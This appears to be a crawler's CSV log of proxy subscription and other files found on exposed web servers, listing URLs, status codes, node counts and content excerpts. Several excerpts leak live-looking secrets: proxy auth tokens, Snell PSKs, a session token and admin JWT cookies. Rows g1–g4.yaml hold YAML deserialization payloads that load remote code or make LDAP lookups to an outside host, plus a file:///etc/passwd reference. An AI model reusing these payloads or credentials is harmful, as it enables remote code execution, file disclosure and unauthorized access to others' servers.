原始URL,最终URL,状态,节点数,HTTP码,响应秒数,是否有更新,历史检查,历史更新,更新频率,上次更新时间,摘要
http://172.98.130.238:8888/imported-names-sorted.txt,http://172.98.130.238:8888/imported-names-sorted.txt,无有效节点,0,200,0.24,否,4,1,1/4,2026-09-02 22:04:30,ActivityLog AddressSuggestion AgreementExtraction AiDraftResponse AiResearchSettings AiResearchSettingsTest AiSettings AiSettingsTest apiBaseUrl applyAgreementExtraction assignAuthzDirectPermission assignAuthzUserRole AttributionCustomer AttributionInfrastructure AttributionTreeNode AuthzApiToken AuthzMe AuthzPermission AuthzRole AuthzUser bulkDeleteCircuits bulkDeleteInfrastructure bulkUpdateCircuits bulkUpdateInfrastructure changeInfrastructureClassification Circuit CircuitDetail CircuitMapDat
http://172.98.130.238:8888/imports-raw.txt,http://172.98.130.238:8888/imports-raw.txt,无有效节点,0,200,0.25,否,4,1,1/4,2026-09-02 22:04:30,"import { ... } from ""@/lib/api"" import { Customer } from ""@/lib/api"" import { ... } from ""@/lib/api"" import { AuthzMe, getAuthzMe } from ""@/lib/api"" import { listServiceProviders } from ""@/lib/api"" import { getServiceProvider } from ""@/lib/api"" import { getServiceProvider } from ""@/lib/api"" import { listCustomers } from ""@/lib/api"" import { getCustomer, listElectricalServices } from ""@/lib/api"" import { getCustomer } from ""@/lib/api"" import { listInfrastructure } from ""@/lib/api"" import { getInf"
http://172.98.130.238:8888/lintout.txt,http://172.98.130.238:8888/lintout.txt,无有效节点,0,200,0.26,否,4,1,1/4,2026-09-02 22:04:30, > circuitos-web@0.1.0 lint > next lint   ./components/markdown-renderer.tsx 144:11  Warning: Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element  ./components/sidebar.tsx 65:13  Warning: Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Im
http://172.98.130.238:8888/lintout2.txt,http://172.98.130.238:8888/lintout2.txt,无有效节点,0,200,0.28,否,4,1,1/4,2026-09-02 22:04:30, > circuitos-web@0.1.0 lint > next lint   ./components/markdown-renderer.tsx 144:11  Warning: Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Image />` from `next/image` to automatically optimize images. This may incur additional usage or cost from your provider. See: https://nextjs.org/docs/messages/no-img-element  @next/next/no-img-element  ./components/sidebar.tsx 65:13  Warning: Using `<img>` could result in slower LCP and higher bandwidth. Consider using `<Im
http://172.98.130.238:8888/mk_full_run.txt,http://172.98.130.238:8888/mk_full_run.txt,无有效节点,0,200,5.75,否,4,1,1/4,2026-09-02 22:04:30,[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m[31mE[0m
http://172.98.130.238:8888/netos-gallery-one.txt,http://172.98.130.238:8888/netos-gallery-one.txt,无有效节点,0,200,0.29,否,4,1,1/4,2026-09-02 22:04:30,gallery smoke one 
http://172.98.130.238:8888/netos-gallery-two.txt,http://172.98.130.238:8888/netos-gallery-two.txt,无有效节点,0,200,0.29,否,4,1,1/4,2026-09-02 22:04:30,gallery smoke two 
http://172.98.130.238:8888/netos-site-document-smoke.txt,http://172.98.130.238:8888/netos-site-document-smoke.txt,无有效节点,0,200,0.22,否,4,1,1/4,2026-09-02 22:04:30,NetOS site document smoke test 
http://172.98.130.238:8888/netos_root.txt,http://172.98.130.238:8888/netos_root.txt,无有效节点,0,200,0.24,否,4,1,1/4,2026-09-02 22:04:30,"{""detail"":""Not Found""}"
http://172.98.130.238:8888/new-names-sorted.txt,http://172.98.130.238:8888/new-names-sorted.txt,无有效节点,0,200,0.23,否,4,1,1/4,2026-09-02 22:04:30,ActivityLog AddressSuggestion AgreementExtraction AgreementExtractionField AiDraftResponse AiResearchSettings AiResearchSettingsTest AiResearchSettingsUpdate AiSettings AiSettingsTest AiSettingsUpdate AlertItem AlertsResponse apiBaseUrl applyAgreementExtraction assignAuthzDirectPermission assignAuthzUserRole AttributionCustomer AttributionFlowItem AttributionInfrastructure AttributionTreeNode AuthzApiToken AuthzMe AuthzPermission AuthzRole AuthzUser bulkDeleteCircuits bulkDeleteInfrastructure bu
http://172.98.130.238:8888/new-names-sorted2.txt,http://172.98.130.238:8888/new-names-sorted2.txt,无有效节点,0,200,0.29,否,4,1,1/4,2026-09-02 22:04:30,ActivityLog AddressSuggestion AgreementExtraction AgreementExtractionField AiDraftResponse AiResearchSettings AiResearchSettingsTest AiResearchSettingsUpdate AiSettings AiSettingsTest AiSettingsUpdate AlertItem AlertsResponse applyAgreementExtraction assignAuthzDirectPermission assignAuthzUserRole AttributionCustomer AttributionFlowItem AttributionInfrastructure AttributionTreeNode AuthzApiToken AuthzMe AuthzPermission AuthzRole AuthzUser bulkDeleteCircuits bulkDeleteInfrastructure bulkUpdateCir
http://172.98.130.238:8888/new-raw.txt,http://172.98.130.238:8888/new-raw.txt,无有效节点,0,200,0.22,否,4,1,1/4,2026-09-02 22:04:30,"3:export type ElectricalServiceDocument = { 14:export type ElectricalService = { 44:export type ElectricalServiceWrite = Partial<Pick< 69:export async function listElectricalServices() { 75:export async function createElectricalService(payload: ElectricalServiceWrite) { 86:export async function updateElectricalService(electricalServiceId: string, payload: ElectricalServiceWrite) { 97:export async function deleteElectricalService(electricalServiceId: string) { 105:export async function uploadElec"
http://172.98.130.238:8888/new-raw2.txt,http://172.98.130.238:8888/new-raw2.txt,无有效节点,0,200,0.26,否,4,1,1/4,2026-09-02 22:04:30,apps/web/lib/api/feedback.ts:3:export type FeedbackRequest = { apps/web/lib/api/feedback.ts:18:export type FeedbackComment = { apps/web/lib/api/feedback.ts:28:export type FeedbackWrite = { apps/web/lib/api/feedback.ts:36:export type FeedbackUpdate = { apps/web/lib/api/feedback.ts:41:export type FeedbackCommentWrite = { apps/web/lib/api/feedback.ts:46:export async function listFeedback() { apps/web/lib/api/feedback.ts:52:export async function createFeedback(payload: FeedbackWrite) { apps/web/lib/
http://172.98.130.238:8888/noauth-me.txt,http://172.98.130.238:8888/noauth-me.txt,无有效节点,0,200,0.27,否,4,1,1/4,2026-09-02 22:04:30,"{""detail"":""Authentication required""}"
http://172.98.130.238:8888/old-names-sorted.txt,http://172.98.130.238:8888/old-names-sorted.txt,无有效节点,0,200,0.98,否,4,1,1/4,2026-09-02 22:04:30,ActivityLog AddressSuggestion AgreementExtraction AgreementExtractionField AiDraftResponse AiResearchSettings AiResearchSettingsTest AiResearchSettingsUpdate AiSettings AiSettingsTest AiSettingsUpdate AlertItem AlertsResponse apiBaseUrl applyAgreementExtraction assignAuthzDirectPermission assignAuthzUserRole AttributionCustomer AttributionFlowItem AttributionInfrastructure AttributionTreeNode AuthzApiToken AuthzMe AuthzPermission AuthzRole AuthzUser bulkDeleteCircuits bulkDeleteInfrastructure bu
http://172.98.130.238:8888/old-names.txt,http://172.98.130.238:8888/old-names.txt,无有效节点,0,200,0.98,否,4,1,1/4,2026-09-02 22:04:30,Circuit Endpoint CircuitDetail AgreementExtractionField AgreementExtraction ImportPreview RenewalReportPreview QuoteSiteSummary VendorQuote QuotePricingOption QuoteStatusHistory VendorQuoteDetail QuoteEndpointCandidate QuoteDraft QuoteDraftPayload QuoteExtractResponse QuoteDraftQueueItem QuoteAggregationRow QuoteWrite ServiceTypeCatalogItem ServiceTypeWrite RFSystemCatalogItem RFSystemWrite PtmpNode PtmpNodeWrite ActivityLog GlobalSearchResult AddressSuggestion AlertItem AlertsResponse FeedbackR
http://172.98.130.238:8888/test-quote.txt,http://172.98.130.238:8888/test-quote.txt,无有效节点,0,200,0.99,否,4,1,1/4,2026-09-02 22:04:30,Vendor: Test Carrier DIA quote. 36 month term MRC $1200 NRC $500. A Loc: Prospect Site. Annual escalator 3%. 
http://172.98.130.238:8888/xtest-management-netplan.yaml,http://172.98.130.238:8888/xtest-management-netplan.yaml,无有效节点,0,200,1.29,否,4,1,1/4,2026-09-02 22:04:30,# XTest management interface. The Mellanox ports are reserved for traffic tests. network:   version: 2   ethernets:     enp6s18:       dhcp4: false       optional: true     enp6s19:       dhcp4: false       addresses:         - 10.10.43.181/24       routes:         - to: default           via: 10.10.43.1           metric: 10       nameservers:         addresses:           - 172.98.130.158           - 172.98.132.254 
http://172.98.130.238:8888/xtest-mellanox-distributed.yaml,http://172.98.130.238:8888/xtest-mellanox-distributed.yaml,无有效节点,0,200,1.36,否,4,1,1/4,2026-09-02 22:04:30,# Distributed test endpoint: one TRex port and one kernel-managed service-test port. network:   version: 2   ethernets:     enp1s0:       dhcp4: false       dhcp6: false       link-local: []       optional: true     enp1s0d1:       dhcp4: false       dhcp6: false       addresses:         - 69.36.7.202/30       routes:         - to: default           via: 69.36.7.201           table: 202       routing-policy:         - from: 69.36.7.202/32           table: 202           priority: 202       link-l
http://172.98.130.238:8888/xtest-mellanox-netplan.yaml,http://172.98.130.238:8888/xtest-mellanox-netplan.yaml,无有效节点,0,200,1.36,否,4,1,1/4,2026-09-02 22:04:30,# XTest traffic interfaces. Addressing and ownership are controlled by TRex. network:   version: 2   ethernets:     enp1s0:       dhcp4: false       dhcp6: false       link-local: []       optional: true     enp1s0d1:       dhcp4: false       dhcp6: false       link-local: []       optional: true 
http://172.98.130.238:8888/xtest-metrics.txt,http://172.98.130.238:8888/xtest-metrics.txt,无有效节点,0,200,2.6,否,4,1,1/4,2026-09-02 22:04:30,"# HELP python_gc_objects_collected_total Objects collected during gc # TYPE python_gc_objects_collected_total counter python_gc_objects_collected_total{generation=""0""} 120808.0 python_gc_objects_collected_total{generation=""1""} 60575.0 python_gc_objects_collected_total{generation=""2""} 1077.0 # HELP python_gc_objects_uncollectable_total Uncollectable objects found during GC # TYPE python_gc_objects_uncollectable_total counter python_gc_objects_uncollectable_total{generation=""0""} 0.0 python_gc_obje"
http://172.98.130.238:8888/xtest-trex-cfg.yaml,http://172.98.130.238:8888/xtest-trex-cfg.yaml,无有效节点,0,200,1.36,否,4,1,1/4,2026-09-02 22:04:30,"- version: 2   port_limit: 2   interfaces:     - enp1s0     - enp1s0d1   port_info:     - ip: 69.36.7.198       default_gw: 69.36.7.197     - ip: 69.36.7.202       default_gw: 69.36.7.201   platform:     master_thread_id: 0     latency_thread_id: 1     dual_if:       - socket: 0         threads: [2, 3, 4, 5, 6, 7] "
http://172.98.130.238:8888/xtest-trex-distributed.yaml,http://172.98.130.238:8888/xtest-trex-distributed.yaml,无有效节点,0,200,1.35,否,4,1,1/4,2026-09-02 22:04:30,"- version: 2   port_limit: 2   interfaces:     - enp1s0     - dummy   port_info:     - ip: 69.36.7.198       default_gw: 69.36.7.197     - ip: 0.0.0.0       default_gw: 0.0.0.0   platform:     master_thread_id: 0     latency_thread_id: 1     dual_if:       - socket: 0         threads: [2, 3, 4, 5, 6, 7] "
http://173.249.210.76:8080/hy2.yaml,http://173.249.210.76:8080/hy2.yaml,提取成功,1,200,0.01,否,4,1,1/4,2026-09-02 22:04:30,
http://173.254.236.235:8080/hc2.yaml,http://173.254.236.235:8080/hc2.yaml,无有效节点,0,200,0.06,否,4,1,1/4,2026-09-02 22:04:30,server: kkgbt.duckdns.org:36712 auth: tN4VGiW9nFHLEe-_PqI-Cg tls:   sni: kkgbt.duckdns.org socks5:   listen: 127.0.0.1:10808 
http://173.254.236.235:8080/hc3.yaml,http://173.254.236.235:8080/hc3.yaml,无有效节点,0,200,0.06,否,4,1,1/4,2026-09-02 22:04:30,server: kkgbt.duckdns.org:443 auth: tN4VGiW9nFHLEe-_PqI-Cg tls:   sni: kkgbt.duckdns.org socks5:   listen: 127.0.0.1:10809 
http://173.254.236.235:8080/hclient.yaml,http://173.254.236.235:8080/hclient.yaml,无有效节点,0,200,0.06,否,4,1,1/4,2026-09-02 22:04:30,server: 127.0.0.1:36712 auth: tN4VGiW9nFHLEe-_PqI-Cg tls:   insecure: true socks5:   listen: 127.0.0.1:10808 
http://176.122.173.89:8088/50fae39a98ca3293.yaml,http://176.122.173.89:8088/50fae39a98ca3293.yaml,提取成功,1,200,0.04,否,4,1,1/4,2026-09-02 22:04:30,
http://177.201.224.25:18080/8b45ca089043fb5068c4f3b630e2b54bf3e66ae4ecca944e.txt,http://177.201.224.25:18080/8b45ca089043fb5068c4f3b630e2b54bf3e66ae4ecca944e.txt,提取成功,1,200,1.27,否,4,1,1/4,2026-09-02 22:04:30,
http://177.201.224.25:18080/clash-541332a1ebc54e6baaad0847d09ec8c68c0128140be94bf6.yaml,http://177.201.224.25:18080/clash-541332a1ebc54e6baaad0847d09ec8c68c0128140be94bf6.yaml,提取成功,1,200,1.24,否,4,1,1/4,2026-09-02 22:04:30,
http://178.104.76.231:8080/de827c14da52174391c5e6c256c45aa5c23f562c0dd598e0.yaml,http://178.104.76.231:8080/de827c14da52174391c5e6c256c45aa5c23f562c0dd598e0.yaml,提取成功,1,200,1.23,否,4,1,1/4,2026-09-02 22:04:30,
http://178.157.63.91/4278aaf0efc5eb06a0fc1b9892f3293f4338c5c165782ab7.yaml,http://178.157.63.91/4278aaf0efc5eb06a0fc1b9892f3293f4338c5c165782ab7.yaml,提取成功,2,200,1.21,是,1,1,1/1,2026-09-04 23:19:55,
http://179.253.232.197:8080/79e87db986de757654fe06fd51af3026.yaml,http://179.253.232.197:8080/79e87db986de757654fe06fd51af3026.yaml,提取成功,3,200,0.23,否,4,1,1/4,2026-09-02 22:04:30,
http://179.253.232.197:8080/xray-9da5575303b6078c.yaml,http://179.253.232.197:8080/xray-9da5575303b6078c.yaml,提取成功,3,200,0.25,否,4,1,1/4,2026-09-02 22:04:30,
http://179.255.117.226:8080/4bbfccb691cbee29.yaml,http://179.255.117.226:8080/4bbfccb691cbee29.yaml,提取成功,1,200,0.88,否,4,1,1/4,2026-09-02 22:04:30,
http://179.255.144.11:18080/069c21d8268e10a6654ac49db5bf2cc0.yaml,http://179.255.144.11:18080/069c21d8268e10a6654ac49db5bf2cc0.yaml,提取成功,3,200,0.8,否,4,1,1/4,2026-09-02 22:04:30,
http://179.255.144.11:18080/all-flclash.yaml,http://179.255.144.11:18080/all-flclash.yaml,提取成功,13,200,0.81,否,4,1,1/4,2026-09-02 22:04:30,
http://179.255.158.131:8080/8357917d1c9f5a85.yaml,http://179.255.158.131:8080/8357917d1c9f5a85.yaml,提取成功,1,200,0.85,否,4,1,1/4,2026-09-02 22:04:30,
http://185.115.35.197/wsgidav.yaml,http://185.115.35.197/wsgidav.yaml,无有效节点,0,200,1.13,否,4,1,1/4,2026-09-02 22:04:30,"﻿host: 0.0.0.0 port: 80 provider_mapping:   /:     root: C:/webdav     readonly: true simple_dc:   user_mapping:     ""*"": true  "
http://185.135.86.187:18080/a32ae8687fb1d8321a671cf0c7351f1449eaa669.yaml,http://185.135.86.187:18080/a32ae8687fb1d8321a671cf0c7351f1449eaa669.yaml,提取成功,1,200,2.5,否,4,1,1/4,2026-09-02 22:04:30,
http://185.213.27.134:8088/g1.yaml,http://185.213.27.134:8088/g1.yaml,无有效节点,0,200,2.48,否,4,1,1/4,2026-09-02 22:04:30,"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [""http://g25032-1.givemebountys.xyz/""]]]] "
http://185.213.27.134:8088/g2.yaml,http://185.213.27.134:8088/g2.yaml,无有效节点,0,200,2.49,否,4,1,1/4,2026-09-02 22:04:30,"swagger: ""2.0"" info: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [""http://g25032-2.givemebountys.xyz/""]]]] paths: {} "
http://185.213.27.134:8088/g3.yaml,http://185.213.27.134:8088/g3.yaml,无有效节点,0,200,2.49,否,4,1,1/4,2026-09-02 22:04:30,"swagger: ""2.0"" info:   title: t   version: ""1""   x-p: !!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ""ldap://g25032-3.givemebountys.xyz/o"", autoCommit: true} paths: {} "
http://185.213.27.134:8088/g4.yaml,http://185.213.27.134:8088/g4.yaml,无有效节点,0,200,2.49,否,4,1,1/4,2026-09-02 22:04:30,"swagger: ""2.0"" info:   title: t   version: ""1"" paths:   /a:     $ref: ""file:///etc/passwd"" "
http://185.213.27.134:8088/ok.yaml,http://185.213.27.134:8088/ok.yaml,无有效节点,0,200,2.48,否,4,1,1/4,2026-09-02 22:04:30,"swagger: ""2.0"" info:   title: OOBMARKER-CANARY-TITLE   version: ""1.0.0""   description: ""canary body g25032-DESC"" paths:   /g25032-PATH:     get:       responses:         200:           description: ok "
http://187.110.166.130:8888/netplan-117.yaml,http://187.110.166.130:8888/netplan-117.yaml,无有效节点,0,200,2.48,否,4,1,1/4,2026-09-02 22:04:30,network:   version: 2   ethernets:     ens19:       dhcp4: no       dhcp6: no       addresses:         - 192.168.99.117/24     ens18:       dhcp4: no       dhcp6: no       addresses:         - 187.110.166.143/27       routes:         - to: default           via: 187.110.166.129       nameservers:         addresses:           - 8.8.8.8           - 1.1.1.1         search:           - parresia.app 
http://191.223.220.68:8880/dmit-hk-t1.yaml,http://191.223.220.68:8880/dmit-hk-t1.yaml,提取成功,11,200,2.28,否,4,1,1/4,2026-09-02 22:04:30,
http://191.223.220.68:8880/lax-malibu.yaml,http://191.223.220.68:8880/lax-malibu.yaml,提取成功,11,200,2.3,否,4,1,1/4,2026-09-02 22:04:30,
http://191.223.220.68:8880/v8.5-remote-fix.yaml,http://191.223.220.68:8880/v8.5-remote-fix.yaml,提取成功,1,200,8.41,否,4,1,1/4,2026-09-02 22:04:30,
http://192.220.32.16/cv-16eab69d5cecba80.yaml,http://192.220.32.16/cv-16eab69d5cecba80.yaml,提取成功,1,200,1.03,否,4,1,1/4,2026-09-02 22:04:30,
http://192.220.32.16/cv-ec63d6e821bbb5d1.yaml,http://192.220.32.16/cv-ec63d6e821bbb5d1.yaml,提取成功,1,200,1.04,否,4,1,1/4,2026-09-02 22:04:30,
http://192.236.145.10:8080/girlfriend-f1e1bcb670ef6d3f7ef30d41.yaml,http://192.236.145.10:8080/girlfriend-f1e1bcb670ef6d3f7ef30d41.yaml,提取成功,1,200,1.05,否,4,1,1/4,2026-09-02 22:04:30,
http://192.236.145.10:8080/rainy-c32b62c4208af34990e007a0.yaml,http://192.236.145.10:8080/rainy-c32b62c4208af34990e007a0.yaml,提取成功,1,200,1.05,否,4,1,1/4,2026-09-02 22:04:30,
http://192.236.151.43/laptop-clash-gpt.yaml,http://192.236.151.43/laptop-clash-gpt.yaml,提取成功,1,200,1.06,否,4,1,1/4,2026-09-02 22:04:30,
http://192.236.151.43/zeekr-d9a9d43ff1de48b6.yaml,http://192.236.151.43/zeekr-d9a9d43ff1de48b6.yaml,提取成功,1,200,1.06,否,4,1,1/4,2026-09-02 22:04:30,
http://192.243.126.238:18080/colleagues-vpsjp-clash-classic-20260430.yaml,http://192.243.126.238:18080/colleagues-vpsjp-clash-classic-20260430.yaml,提取成功,1,200,2.35,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/colleagues-vpsjp-clash-compat-20260501.yaml,http://192.243.126.238:18080/colleagues-vpsjp-clash-compat-20260501.yaml,提取成功,1,200,2.29,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/colleagues-vpsjp-mihomo-full-20260430.yaml,http://192.243.126.238:18080/colleagues-vpsjp-mihomo-full-20260430.yaml,提取成功,1,200,2.29,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/friend1-vpsjp-clash-8443-20260505-3791474b.yaml,http://192.243.126.238:18080/friend1-vpsjp-clash-8443-20260505-3791474b.yaml,提取成功,1,200,2.29,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/friend2-vpsjp-clash-8443-20260505-fe50e3a5.yaml,http://192.243.126.238:18080/friend2-vpsjp-clash-8443-20260505-fe50e3a5.yaml,提取成功,1,200,2.3,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/gf-shadowrocket-optimized-20260524-c9073268.txt,http://192.243.126.238:18080/gf-shadowrocket-optimized-20260524-c9073268.txt,提取成功,9,200,2.3,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-reality-friend-01-22f48954a782.txt,http://192.243.126.238:18080/guoshuo-reality-friend-01-22f48954a782.txt,提取成功,1,200,2.29,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-reality-friend-02-b8301c90835f.txt,http://192.243.126.238:18080/guoshuo-reality-friend-02-b8301c90835f.txt,提取成功,1,200,2.3,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-shadowrocket-best-20260524-164950-2b42e8b5.txt,http://192.243.126.238:18080/guoshuo-shadowrocket-best-20260524-164950-2b42e8b5.txt,提取成功,11,200,1.77,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-shadowrocket-mined-20260524-2b42e8b5.txt,http://192.243.126.238:18080/guoshuo-shadowrocket-mined-20260524-2b42e8b5.txt,提取成功,11,200,1.78,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-shadowrocket-optimized-20260524-671c7155.txt,http://192.243.126.238:18080/guoshuo-shadowrocket-optimized-20260524-671c7155.txt,提取成功,9,200,1.71,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-shadowrocket-rerank-20260524-170723-40457166.txt,http://192.243.126.238:18080/guoshuo-shadowrocket-rerank-20260524-170723-40457166.txt,提取成功,11,200,1.7,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-shadowrocket-vps-current-20260524-150114-c5f352eb.txt,http://192.243.126.238:18080/guoshuo-shadowrocket-vps-current-20260524-150114-c5f352eb.txt,提取成功,3,200,1.72,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-shadowrocket-vps-current-edgetunnel-20260524-2e275c36.txt,http://192.243.126.238:18080/guoshuo-shadowrocket-vps-current-edgetunnel-20260524-2e275c36.txt,提取成功,4,200,1.72,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-shadowrocket-vps-dler-20260509-114731-01ece5e7.txt,http://192.243.126.238:18080/guoshuo-shadowrocket-vps-dler-20260509-114731-01ece5e7.txt,提取成功,137,200,4.94,是,1,1,1/1,2026-09-04 23:19:55,
http://192.243.126.238:18080/guoshuo-shadowrocket-vps-dler-reality-20260509-120321-f4939f81.txt,http://192.243.126.238:18080/guoshuo-shadowrocket-vps-dler-reality-20260509-120321-f4939f81.txt,提取成功,138,200,4.82,是,1,1,1/1,2026-09-04 23:19:55,
http://192.255.151.112:2080/de8a282088fd68c213e2c2c9ec751d005ef406c7c0a20a00d6f0888a1c49103c.yaml,http://192.255.151.112:2080/de8a282088fd68c213e2c2c9ec751d005ef406c7c0a20a00d6f0888a1c49103c.yaml,提取成功,2,200,1.24,否,4,1,1/4,2026-09-02 22:04:30,
http://192.255.151.112:2080/personal-clash-e87d6a5cf302fcbe18978c4119d76cefbd85531ab7e0bd0781e9a9fec49e4828.yaml,http://192.255.151.112:2080/personal-clash-e87d6a5cf302fcbe18978c4119d76cefbd85531ab7e0bd0781e9a9fec49e4828.yaml,提取成功,4,200,1.27,否,4,1,1/4,2026-09-02 22:04:30,
http://192.3.247.109:2083/ecd1659fd28943d8.yaml,http://192.3.247.109:2083/ecd1659fd28943d8.yaml,提取成功,2,200,1.23,否,4,1,1/4,2026-09-02 22:04:30,
http://192.3.247.87:18080/clash-8443.yaml,http://192.3.247.87:18080/clash-8443.yaml,提取成功,1,200,1.28,否,4,1,1/4,2026-09-02 22:04:30,
http://192.3.247.87:18080/clash.yaml,http://192.3.247.87:18080/clash.yaml,提取成功,1,200,1.23,否,4,1,1/4,2026-09-02 22:04:30,
http://192.3.85.235:18080/artifact_full.yaml,http://192.3.85.235:18080/artifact_full.yaml,无有效节点,0,200,1.22,是,1,1,1/1,2026-09-04 23:19:55,"{""status"":""success"",""data"":{""name"":""flclash-config"",""template"":""proxies: {{ getSubs }}\nproxy-groups:\n  - name: PROXY\n    type: select\n    proxies:\n      - AUTO\n      - DIRECT\n  - name: AUTO\n    type: url-test\n    url: http://www.gstatic.com/generate_204\n    interval: 300\n    tolerance: 50\n    proxies: {{ getSubs }}\nrules:\n  - MATCH,PROXY"",""subscriptionNames"":[""vless-vmess""]}}"
http://192.3.85.235:18080/artifact_test.yaml,http://192.3.85.235:18080/artifact_test.yaml,无有效节点,0,200,1.21,是,1,1,1/1,2026-09-04 23:19:55,"{""status"":""failed"",""error"":{""code"":""RESOURCE_NOT_FOUND"",""type"":""ResourceNotFoundError"",""message"":""Subscription flclash-config does not exist!""}}"
http://192.3.85.235:18080/bwg_t1.yaml,http://192.3.85.235:18080/bwg_t1.yaml,无有效节点,0,200,1.23,是,1,1,1/1,2026-09-04 23:19:55,"mixed-port: 17890 allow-lan: false mode: rule log-level: info ipv6: false proxies:   - name: ""BWG-Direct""     type: snell     server: 144.34.225.200     port: 3345     psk: ""u6O1FEDhnM5oVsy5xnyGtQ==""     version: 5   - name: ""BWG-STLS""     type: snell     server: 144.34.225.200     port: 46398     psk: ""u6O1FEDhnM5oVsy5xnyGtQ==""     version: 5     shadow-tls:       enabled: true       password: ""63880cc8eb90c143979069b164ad4976""       sni: ""www.microsoft.com""       version: 2   - name: ""DC3-Dire"
http://192.3.85.235:18080/flclash_test.yaml,http://192.3.85.235:18080/flclash_test.yaml,提取成功,7,200,1.21,是,1,1,1/1,2026-09-04 23:19:55,
http://192.3.85.235:18080/login_resp.txt,http://192.3.85.235:18080/login_resp.txt,无有效节点,0,200,1.22,是,1,1,1/1,2026-09-04 23:19:55,"{""status"":""success"",""message"":"""",""data"":{""set-cookie"":{""session_token"":""2SsyjnHJbMOQSF5JkdInhWvip0Fpbz81""}}}"
http://192.3.85.235:18080/m.txt,http://192.3.85.235:18080/m.txt,无有效节点,0,200,1.22,是,1,1,1/1,2026-09-04 23:19:55,# Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk.  #HttpOnly_127.0.0.1	FALSE	/	FALSE	1787240737	meridian_session	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsIm5hbWUiOiJhZG1pbiIsImV4cCI6MTc4NzI0MDczN30.7JQVN2FQmdXzVRIddiTbG5vWwMXURAT6L3_hL4c4MDU 
http://192.3.85.235:18080/m2.txt,http://192.3.85.235:18080/m2.txt,无有效节点,0,200,1.22,是,1,1,1/1,2026-09-04 23:19:55,# Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk.  #HttpOnly_127.0.0.1	FALSE	/	FALSE	1787237248	meridian_session	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsIm5hbWUiOiJhZG1pbiIsImV4cCI6MTc4NzIzNzI0OH0.Up94rmcyGByKQ3sK4Y6lIn1XRYrRaVDzrLOl1VBWYl0 
